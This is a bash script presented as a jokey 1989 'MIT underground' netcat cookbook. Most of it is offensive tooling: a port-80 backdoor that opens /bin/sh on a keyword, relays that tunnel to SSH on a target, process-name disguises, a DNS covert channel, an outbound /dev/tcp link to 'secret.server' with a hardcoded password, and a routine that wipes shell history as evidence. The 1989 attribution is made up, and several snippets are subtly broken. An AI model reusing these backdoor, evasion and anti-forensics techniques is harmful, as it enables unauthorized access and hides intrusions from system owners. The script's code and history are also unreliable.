#!/bin/bash
# The Netcat Cookbook: MIT Underground Edition (1989)
# "For Educational Purposes Only" 😉

# The Classic Reverse Pipe
# Makes any TCP service available through another port
mkfifo /tmp/backpipe
nc -l -p 8080 0</tmp/backpipe | nc towel.blinkenlights.nl 23 1>/tmp/backpipe &
echo "Star Wars is now on port 8080!"

# The Double Dutch Tunnel
# Hide your traffic inside "legitimate" connections
nc -l -p 443 | \
  tee >(sed 's/^/[HTTPS] /' > ~/logs/fake_ssl.log) | \
  nc actual.target.edu 22 | \
  tee >(sed 's/^/[SSL-RESP] /' >> ~/logs/fake_ssl.log)

# The Academic Multiplexer
# Run multiple hidden services on one port
nc -l -p 80 | \
while read line; do
  case "$line" in
    "GET /thesis"*) echo "Your thesis is overdue" ;;
    "CRYPTO"*) nc crypto.server.com 1337 ;;
    "SHELL"*) /bin/sh ;;
    *) echo "HTTP/1.0 404 Not Found\r\n\r\n<h1>Normal Web Server</h1>" ;;
  esac
done

# The Process Disguiser Deluxe
# Makes netcat look like innocent academic software
run_disguised() {
  local real_cmd="$1"
  local fake_name="$2"
  
  # Create wrapper script
  cat > /tmp/.wrapper$$ << EOF
#!/bin/bash
exec -a "$fake_name" $real_cmd
EOF
  chmod +x /tmp/.wrapper$$
  /tmp/.wrapper$$ &
  rm -f /tmp/.wrapper$$
}

# Usage:
run_disguised "nc -l -p 31337" "vi thesis_final_v2.tex"
run_disguised "nc hack.chat 6667" "gcc -O2 homework3.c"

# The Load Balancer (Distribute CPU across lab machines)
for i in {1..10}; do
  echo "Starting job on athena$i..."
  ssh athena$i.mit.edu "exec -a 'make homework' nc -l -p 3133$i" &
done

# The Covert Channel Chat
# Looks like DNS queries but it's actually a chat
chat_covert() {
  # Sender
  echo "$1" | xxd -p | while read hex; do
    dig @8.8.8.8 $hex.fakedomain.com &
  done
  
  # Receiver (on another terminal)
  nc -u -l -p 53 | xxd -r -p
}

# The "Compiler Output" Generator
# Hides your real output in fake compiler messages
compile_disguise() {
  $@ 2>&1 | while read line; do
    case $((RANDOM % 10)) in
      0) echo "cc1: optimizing loop at line $((RANDOM % 1000))" ;;
      1) echo "ld: linking object files..." ;;
      2) echo "[$line]" ;;  # Sometimes show real output
      3) echo "gcc: analyzing control flow graph..." ;;
      *) echo "compiling: $(printf '%s\n' *.c | shuf -n1)" ;;
    esac
    sleep 0.$((RANDOM % 9))
  done
}

# The Traffic Shaper
# Makes your hack look like normal web browsing
shape_traffic() {
  while true; do
    # Real traffic (small bursts)
    nc target.server 22 < input_data &
    PID=$!
    
    # Fake traffic (continuous)
    for i in {1..100}; do
      curl -s http://web.mit.edu > /dev/null &
      sleep 0.1
    done
    
    wait $PID
    sleep $((RANDOM % 60))
  done
}

# The Emergency Cleanup
panic_mode() {
  # Kill all netcat
  killall nc 2>/dev/null
  
  # Clear evidence
  > ~/.bash_history
  rm -f /tmp/backpipe*
  
  # Start decoys
  yes "Calculating pi to 1000000 digits..." | head -1000 &
  find / -name "*.tex" 2>/dev/null | head -100 &
  
  # Show fake error
  echo "Segmentation fault (core dumped)"
  echo "gcc: internal compiler error: in propagate_block, at flow.c:1642"
  echo "Please submit a full bug report to gcc@gnu.org"
}

# The Ultimate Pipeline
# This is what we called "The MIT Special"
the_mit_special() {
  # Layer 1: Look like NFS
  socat TCP-LISTEN:2049,fork,reuseaddr EXEC:"./layer2.sh" &
  
  # Layer 2: Encrypt and route
  cat > layer2.sh << 'LAYER2'
#!/bin/bash
exec 3<>/dev/tcp/secret.server/1337
openssl enc -aes-128-cbc -pass pass:mit1989 <&3 | 
  nc -l -p 0 |
  openssl enc -d -aes-128-cbc -pass pass:mit1989 >&3
LAYER2
  
  # Layer 3: Access with innocent name
  exec -a "rpc.nfsd" nc localhost 2049
}

# The Best Alias Collection
alias vi='exec -a vi nc'
alias emacs='exec -a emacs nc' 
alias make='exec -a make nc'
alias gcc='exec -a gcc nc'
alias latex='exec -a latex nc'

# Now every nc looks like an editor!

echo "=== MIT NETCAT COOKBOOK LOADED ==="
echo "Remember: We're not hacking, we're 'researching network protocols'"
echo "If asked: 'Professor Zimmermann suggested this approach'"